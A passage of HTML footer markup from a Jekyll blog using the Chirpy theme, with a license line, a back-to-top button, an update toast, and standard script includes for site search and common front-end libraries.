4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0">Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></div></footer><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lazysizes@5.3.2/lazysizes.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
